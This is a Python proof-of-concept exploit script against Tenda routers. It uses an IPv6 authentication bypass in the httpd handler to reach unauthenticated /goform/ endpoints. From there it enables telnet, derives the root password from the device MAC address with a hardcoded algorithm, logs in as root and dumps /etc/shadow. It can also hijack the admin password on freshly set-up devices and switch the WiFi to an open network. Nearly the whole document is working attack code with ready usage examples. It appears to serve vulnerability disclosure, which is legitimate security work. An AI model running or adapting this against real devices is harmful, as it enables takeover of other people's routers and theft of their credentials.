#!/usr/bin/env python3
"""
Tenda Router — IPv6 Authentication Bypass via strstr Substring Match
Unauthenticated Access to All /goform/ Handlers

VULNERABILITY:
  R7WebsSecurityHandler in /bin/httpd uses check_is_ipv6() to detect IPv6
  clients. When the client IP contains 2+ colons (IPv6), the entire auth
  check is skipped. The code only allows requests whose URL contains both
  "goform/" and "fast_setting_wifi_set" (via strstr substring match).

  Because strstr is a substring match on the FULL URL (including query
  string), any goform endpoint is reachable unauthenticated by appending
  "?fast_setting_wifi_set" as a query parameter.

IMPACT:
  Unauthenticated access to ALL /goform/ handlers from the LAN via IPv6.
  This includes password change, telnet enable, WiFi reconfiguration,
  firmware upload, and more. IPv6 link-local is always available — no
  IPv6 configuration required on the router.

PREREQUISITES:
  - LAN access (same network segment as the router)
  - Router's IPv6 link-local address (fe80::...) — auto-assigned, always
    present even when IPv6 is not configured by the user
  - For password change: the device must be in initial setup state (no
    admin password set yet) OR the current password must be known. The
    web admin password has NO factory default — it is empty until the
    user sets one on first login.
  - For telnet enable and WiFi changes: no password knowledge needed

NOTE ON PASSWORDS:
  The web admin password (g_Pass / sys.userpass) is NOT the same as the
  root system password. The web admin password starts empty and must be
  set by the user during first login.

  The root/telnet password is derived from the device MAC address by the
  cnsl_safe binary at boot:
    MAC octets [4],[5] → "{mac[4]:02x}1w6lm2p_955{mac[5]:02x}" → base64
  Special case: MAC 00:90:4c:88:88:88 → password "Fireitup"

TESTED ON:
  Tenda AC series firmware (httpd binary with R7WebsSecurityHandler)

USAGE:
  # Discover router's IPv6 link-local address:
  ping6 -c2 ff02::1%eth0

  # Full automated exploit — enable telnet, derive password, get root shell:
  python3 poc_ipv6_auth_bypass.py --target fe80::1 --iface eth0 --enable-telnet

  # If MAC auto-detection fails, provide it manually:
  python3 poc_ipv6_auth_bypass.py --target fe80::1 --iface eth0 --enable-telnet \\
      --mac AA:BB:CC:DD:EE:FF

  # Set password on fresh device (race condition — before user sets one):
  python3 poc_ipv6_auth_bypass.py --target fe80::1 --iface eth0 \\
      --old-password "" --new-password attacker123

  # Verify bypass only (non-destructive):
  python3 poc_ipv6_auth_bypass.py --target fe80::1 --iface eth0 --verify-only
"""

import argparse
import base64
import re
import socket
import subprocess
import sys
import telnetlib
import time
import urllib.parse


# ─── HTTP over IPv6 ────────────────────────────────────────────────────

def build_http_request(method: str, path: str, host: str, body: str = "") -> bytes:
    """Build a raw HTTP/1.0 request."""
    lines = [
        f"{method} {path} HTTP/1.0",
        f"Host: {host}",
        "User-Agent: Mozilla/5.0",
        "Content-Type: application/x-www-form-urlencoded",
        "Connection: close",
    ]
    if body:
        lines.append(f"Content-Length: {len(body)}")
    lines.append("")
    lines.append(body)
    return "\r\n".join(lines).encode()


def send_ipv6_request(
    target: str, port: int, iface: str, method: str, path: str, body: str = ""
) -> str:
    """Send an HTTP request to the target over IPv6 link-local."""
    scope_id = socket.if_nametoindex(iface)
    addr = (target, port, 0, scope_id)

    sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    sock.settimeout(10)

    try:
        sock.connect(addr)
        host = f"[{target}%{iface}]"
        request = build_http_request(method, path, host, body)
        sock.sendall(request)

        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break

        return response.decode(errors="replace")
    finally:
        sock.close()


# ─── MAC Address Discovery ─────────────────────────────────────────────

def derive_mac_from_ipv6(ipv6_addr: str) -> str | None:
    """
    Extract MAC address from an EUI-64 IPv6 link-local address.

    EUI-64 format: fe80::AABB:CCff:feDD:EEFF
    Derived from MAC AA:BB:CC:DD:EE:FF by:
      1. Insert ff:fe in the middle
      2. Flip the 7th bit (universal/local) of the first octet
    """
    try:
        expanded = socket.inet_pton(socket.AF_INET6, ipv6_addr)
        # Interface ID is the last 8 bytes
        iid = expanded[8:]

        # Check for EUI-64 marker: bytes [3:5] should be ff:fe
        if iid[3] != 0xFF or iid[4] != 0xFE:
            return None

        # Reconstruct MAC
        mac_bytes = [
            iid[0] ^ 0x02,  # flip bit 7 (universal/local)
            iid[1],
            iid[2],
            iid[5],
            iid[6],
            iid[7],
        ]
        return ":".join(f"{b:02x}" for b in mac_bytes)
    except Exception:
        return None


def get_mac_from_ndp(target: str, iface: str) -> str | None:
    """Get MAC from IPv6 NDP neighbor table (Linux ip -6 neigh)."""
    try:
        result = subprocess.run(
            ["ip", "-6", "neigh", "show", "dev", iface],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                if target.lower() in line.lower():
                    match = re.search(
                        r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})", line
                    )
                    if match:
                        return match.group(1).lower()
    except FileNotFoundError:
        pass
    return None


def get_mac_from_arp(target_ipv4: str) -> str | None:
    """Get MAC from IPv4 ARP table as fallback."""
    try:
        result = subprocess.run(
            ["ip", "neigh", "show", target_ipv4],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode == 0 and result.stdout.strip():
            match = re.search(
                r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})", result.stdout
            )
            if match:
                return match.group(1).lower()
    except FileNotFoundError:
        pass

    try:
        result = subprocess.run(
            ["arp", "-n", target_ipv4],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode == 0:
            match = re.search(
                r"([0-9a-fA-F]{2}(?:[:-][0-9a-fA-F]{2}){5})", result.stdout
            )
            if match:
                return match.group(1).replace("-", ":").lower()
    except FileNotFoundError:
        pass

    return None


def discover_mac(target: str, iface: str) -> str | None:
    """
    Try multiple methods to discover the router's MAC address:
      1. Parse from EUI-64 IPv6 link-local address
      2. Check IPv6 NDP neighbor table
      3. Check IPv4 ARP table for default gateway (192.168.0.1)
    """
    # Method 1: derive from EUI-64 link-local address
    mac = derive_mac_from_ipv6(target)
    if mac:
        print(f"[+] MAC from EUI-64 address: {mac}")
        return mac

    # Method 2: NDP neighbor table (we just sent HTTP traffic)
    mac = get_mac_from_ndp(target, iface)
    if mac:
        print(f"[+] MAC from NDP neighbor table: {mac}")
        return mac

    # Method 3: ARP table for Tenda default IPv4 (192.168.0.1)
    mac = get_mac_from_arp("192.168.0.1")
    if mac:
        print(f"[+] MAC from ARP table (192.168.0.1): {mac}")
        return mac

    return None


# ─── Telnet Password Derivation ────────────────────────────────────────

def derive_telnet_password(mac: str) -> str:
    """
    Derive the root/telnet password from the device MAC address.

    Algorithm from cnsl_safe binary:
      1. Take MAC octets [4] and [5] (0-indexed)
      2. Format: "{mac[4]:02x}1w6lm2p_955{mac[5]:02x}"
      3. Base64-encode the result

    Special case: MAC 00:90:4c:88:88:88 → password is "Fireitup"
    Fallback MAC (factory flash read fails): 00:11:22:33:44:55
    """
    octets = [int(b, 16) for b in mac.split(":")]

    if octets == [0x00, 0x90, 0x4C, 0x88, 0x88, 0x88]:
        return "Fireitup"

    pre_encode = f"{octets[4]:02x}1w6lm2p_955{octets[5]:02x}"
    return base64.b64encode(pre_encode.encode()).decode()


# ─── Exploit Actions ───────────────────────────────────────────────────

def verify_bypass(target: str, port: int, iface: str) -> bool:
    """Verify the IPv6 auth bypass works by hitting an info endpoint."""
    print("[*] Verifying IPv6 authentication bypass...")

    path = "/goform/getLoginInfo?fast_setting_wifi_set=1"
    try:
        resp = send_ipv6_request(target, port, iface, "GET", path)
        if "HTTP/1.0 200" in resp or "HTTP/1.1 200" in resp:
            print("[+] Auth bypass confirmed — got 200 OK without credentials")
            if "\r\n\r\n" in resp:
                body = resp.split("\r\n\r\n", 1)[1]
                print(f"[+] Response: {body[:200]}")
            return True
        elif "302" in resp:
            print("[-] Got redirect — bypass may not work on this firmware version")
            return False
        else:
            print(f"[-] Unexpected response: {resp[:200]}")
            return False
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return False


def enable_telnet(target: str, port: int, iface: str) -> bool:
    """
    Enable telnet on the router via the auth bypass.
    No password knowledge required — the /goform/telnet handler has no
    internal auth check.
    """
    print("[*] Enabling telnet via IPv6 auth bypass...")

    path = "/goform/telnet?fast_setting_wifi_set=1"

    try:
        resp = send_ipv6_request(target, port, iface, "GET", path)
        if "HTTP/1.0 200" in resp or "HTTP/1.1 200" in resp:
            print("[+] Telnet enable request sent — 200 OK")
            return True
        else:
            # Some firmware versions may still start telnet even on redirect
            print(f"[*] Response: {resp[:200]}")
            print("[*] Proceeding to check if telnet started anyway...")
            return True
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return False


def wait_for_telnet(target: str, iface: str, port: int = 23) -> bool:
    """Wait for telnetd to start listening."""
    print(f"[*] Waiting for telnetd on port {port}...")

    scope_id = socket.if_nametoindex(iface)

    for attempt in range(5):
        try:
            sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target, port, 0, scope_id))
            sock.close()
            print(f"[+] Telnet port {port} is OPEN!")
            return True
        except (ConnectionRefusedError, socket.timeout, OSError):
            print(f"    Attempt {attempt + 1}/5: not yet, retrying in 2s...")
            time.sleep(2)
        finally:
            try:
                sock.close()
            except Exception:
                pass

    print(f"[-] Telnet port {port} did not open after 5 attempts.")
    return False


def telnet_login_and_dump(target: str, iface: str, password: str) -> bool:
    """
    Connect to telnet via IPv6, login as root, dump /etc/shadow.

    Uses raw sockets for IPv6 link-local with scope ID, since telnetlib
    doesn't support scope IDs natively.
    """
    print(f"[*] Connecting to telnet as root...")
    print(f"    Password: {password}")

    scope_id = socket.if_nametoindex(iface)

    try:
        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target, 23, 0, scope_id))

        tn = telnetlib.Telnet()
        tn.sock = sock

        # Wait for login prompt
        tn.read_until(b"login: ", timeout=5)
        tn.write(b"root\n")

        # Wait for password prompt
        tn.read_until(b"assword:", timeout=5)
        tn.write(password.encode() + b"\n")

        # Wait for shell prompt or error
        time.sleep(2)
        response = tn.read_very_eager().decode("ascii", errors="replace")

        if "incorrect" in response.lower() or "denied" in response.lower():
            print(f"[-] Login failed — password may be wrong")
            print(f"    Response: {response.strip()[:200]}")
            tn.close()
            return False

        print(f"[+] ROOT SHELL OBTAINED!")
        print()

        # Prove access: dump /etc/shadow
        print("=" * 60)
        print("  Proof of access — /etc/shadow:")
        print("=" * 60)
        tn.write(b"cat /etc/shadow\n")
        time.sleep(1)
        shadow = tn.read_very_eager().decode("ascii", errors="replace")
        for line in shadow.strip().splitlines():
            line = line.strip()
            if line and not line.startswith("cat "):
                print(f"  {line}")
        print("=" * 60)
        print()

        # Also show system info
        tn.write(b"cat /proc/version\n")
        time.sleep(0.5)
        version = tn.read_very_eager().decode("ascii", errors="replace")
        for line in version.strip().splitlines():
            line = line.strip()
            if line and "Linux version" in line:
                print(f"  Kernel: {line[:100]}")

        tn.write(b"id\n")
        time.sleep(0.5)
        uid = tn.read_very_eager().decode("ascii", errors="replace")
        for line in uid.strip().splitlines():
            line = line.strip()
            if "uid=" in line:
                print(f"  Identity: {line}")

        tn.close()
        return True

    except EOFError:
        print(f"[-] Connection closed unexpectedly")
        return False
    except Exception as e:
        print(f"[-] Telnet failed: {e}")
        return False


def change_password(
    target: str, port: int, iface: str, old_pwd: str, new_pwd: str
) -> bool:
    """
    Change admin password via the auth bypass.

    NOTE: The handler (fromSysToolChangePwd) validates the old password
    internally. This works when:
      - Device is in initial setup (old password is empty string)
      - The current password is known
    """
    print(f"[*] Attempting password change via IPv6 auth bypass...")
    if old_pwd == "":
        print("[*] Using empty old password (targeting fresh/reset device)")
    else:
        print(f"[*] Old password: {old_pwd!r}")
    print(f"[*] New password: {new_pwd!r}")

    path = "/goform/SysToolChangePwd?fast_setting_wifi_set=1"

    body = urllib.parse.urlencode({
        "SYSOPS": old_pwd,
        "SYSPS": new_pwd,
        "SYSPS2": new_pwd,
    })

    try:
        resp = send_ipv6_request(target, port, iface, "POST", path, body)
        if "login.html" in resp:
            print("[+] Password changed successfully (redirected to login)")
            print(f"[+] New admin password: {new_pwd}")
            return True
        elif "system_password.html?1" in resp:
            print("[-] Failed — old password is incorrect")
            print("    The device likely has a user-configured password.")
            return False
        elif "system_password.html" in resp and "?1" not in resp:
            print("[-] New password same as old — pick a different password")
            return False
        elif "main.html" in resp:
            print("[+] Password cleared (set to empty) — redirected to main")
            return True
        else:
            print(f"[?] Unexpected response: {resp[:300]}")
            return False
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return False


def set_wifi(
    target: str, port: int, iface: str, ssid: str, wifi_password: str
) -> bool:
    """Change WiFi SSID and password via the auth bypass."""
    print("[*] Changing WiFi settings via IPv6 auth bypass...")
    print(f"[*] New SSID: {ssid!r}")
    password_display = wifi_password or "(open network)"
    print(f"[*] New WiFi password: {password_display!r}")

    path = "/goform/fast_setting_wifi_set?fast_setting_wifi_set=1"

    params = {"ssid": ssid}
    if wifi_password:
        params["security"] = "wpapsk"
        params["wrlPwd"] = wifi_password
    else:
        params["security"] = "none"
        params["wrlPwd"] = ""

    body = urllib.parse.urlencode(params)

    try:
        resp = send_ipv6_request(target, port, iface, "POST", path, body)
        print(f"[+] WiFi config request sent")
        if "\r\n\r\n" in resp:
            resp_body = resp.split("\r\n\r\n", 1)[1]
            print(f"[+] Response: {resp_body[:200]}")
        return True
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return False


# ─── Main ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Tenda Router IPv6 Auth Bypass — Unauthenticated /goform/ Access",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Discover router IPv6 address:
  ping6 -c2 ff02::1%%eth0

  # Full automated exploit — enable telnet + root shell + shadow dump:
  %(prog)s --target fe80::1 --iface eth0 --enable-telnet

  # With manual MAC (if auto-detection fails):
  %(prog)s --target fe80::1 --iface eth0 --enable-telnet --mac AA:BB:CC:DD:EE:FF

  # Set password on fresh/reset device:
  %(prog)s --target fe80::1 --iface eth0 --old-password "" --new-password pwned

  # Change WiFi to open network:
  %(prog)s --target fe80::1 --iface eth0 --set-wifi --ssid "Free WiFi"

  # Verify bypass only (non-destructive):
  %(prog)s --target fe80::1 --iface eth0 --verify-only
        """,
    )
    parser.add_argument(
        "--target", required=True,
        help="Router IPv6 link-local address (e.g. fe80::1)",
    )
    parser.add_argument(
        "--iface", required=True,
        help="Network interface (e.g. eth0, wlan0)",
    )
    parser.add_argument(
        "--port", type=int, default=80, help="HTTP port (default: 80)",
    )
    parser.add_argument(
        "--mac", default=None,
        help="Device MAC address (e.g. AA:BB:CC:DD:EE:FF). Auto-detected if omitted.",
    )

    # Actions
    parser.add_argument(
        "--enable-telnet", action="store_true",
        help="Enable telnet, auto-login as root, dump /etc/shadow",
    )
    parser.add_argument(
        "--old-password", help='Current admin password ("" for fresh device)',
    )
    parser.add_argument("--new-password", help="New admin password to set")
    parser.add_argument(
        "--set-wifi", action="store_true",
        help="Change WiFi settings (no password knowledge required)",
    )
    parser.add_argument("--ssid", help="New WiFi SSID (requires --set-wifi)")
    parser.add_argument(
        "--wifi-password", default="",
        help='New WiFi password (empty = open network)',
    )
    parser.add_argument(
        "--verify-only", action="store_true",
        help="Only verify the bypass, don't change anything",
    )

    args = parser.parse_args()

    print("=" * 60)
    print("  Tenda Router — IPv6 Authentication Bypass")
    print("  Unauthenticated /goform/ access via strstr match")
    print("=" * 60)
    print(f"  Target: [{args.target}%{args.iface}]:{args.port}")
    print()

    # ── Step 1: Verify bypass ──────────────────────────────────────────
    if not verify_bypass(args.target, args.port, args.iface):
        print("\n[-] Auth bypass verification failed. Exiting.")
        sys.exit(1)

    if args.verify_only:
        print("\n[*] Verify-only mode. Done.")
        sys.exit(0)

    print()

    # ── Action: Enable Telnet (full chain) ─────────────────────────────
    if args.enable_telnet:
        # 1. Enable telnet via auth bypass
        if not enable_telnet(args.target, args.port, args.iface):
            sys.exit(1)
        print()

        # 2. Wait for telnetd to start
        if not wait_for_telnet(args.target, args.iface):
            print("[-] telnetd did not start. Exiting.")
            sys.exit(1)
        print()

        # 3. Discover MAC address
        print("[*] Discovering device MAC address...")
        if args.mac:
            mac = args.mac.strip().lower().replace("-", ":")
            print(f"[+] Using provided MAC: {mac}")
        else:
            mac = discover_mac(args.target, args.iface)
            if not mac:
                print("[-] Could not auto-detect MAC address.")
                print("    Re-run with --mac AA:BB:CC:DD:EE:FF")
                print(f"    (check router label or: ip -6 neigh show dev {args.iface})")
                sys.exit(1)

        # 4. Derive root password
        password = derive_telnet_password(mac)
        print(f"[+] Derived root password: {password}")
        print(f"    Algorithm: base64(\"{mac.split(':')[4]}1w6lm2p_955{mac.split(':')[5]}\")")
        print()

        # 5. Login and dump shadow
        success = telnet_login_and_dump(args.target, args.iface, password)

        # Summary
        print()
        print("=" * 60)
        if success:
            print("  RESULT: FULL DEVICE COMPROMISE")
            print()
            print("  Kill chain:")
            print("    1. Connect to httpd via IPv6 link-local")
            print("    2. GET /goform/telnet?fast_setting_wifi_set=1")
            print("       → auth bypass (strstr substring match)")
            print("       → telnetd started on port 23")
            print(f"    3. MAC {mac} → root password: {password}")
            print("    4. telnet login as root → /etc/shadow dumped")
            print()
            print(f"  Reconnect: telnet {args.target}%{args.iface}")
            print(f"  Login:     root / {password}")
        else:
            print("  RESULT: Telnet enabled but login failed")
            print()
            print(f"  MAC used: {mac}")
            print(f"  Password: {password}")
            print("  Try manually or provide correct MAC with --mac")
        print("=" * 60)
        sys.exit(0 if success else 1)

    # ── Action: Password Change ────────────────────────────────────────
    elif args.old_password is not None and args.new_password is not None:
        success = change_password(
            args.target, args.port, args.iface,
            args.old_password, args.new_password,
        )
        sys.exit(0 if success else 1)

    # ── Action: WiFi Change ────────────────────────────────────────────
    elif args.set_wifi:
        if not args.ssid:
            parser.error("--set-wifi requires --ssid")
        success = set_wifi(
            args.target, args.port, args.iface,
            args.ssid, args.wifi_password,
        )
        sys.exit(0 if success else 1)

    else:
        parser.error(
            "Specify an action: --enable-telnet, --old-password/--new-password, "
            "--set-wifi, or --verify-only"
        )


if __name__ == "__main__":
    main()
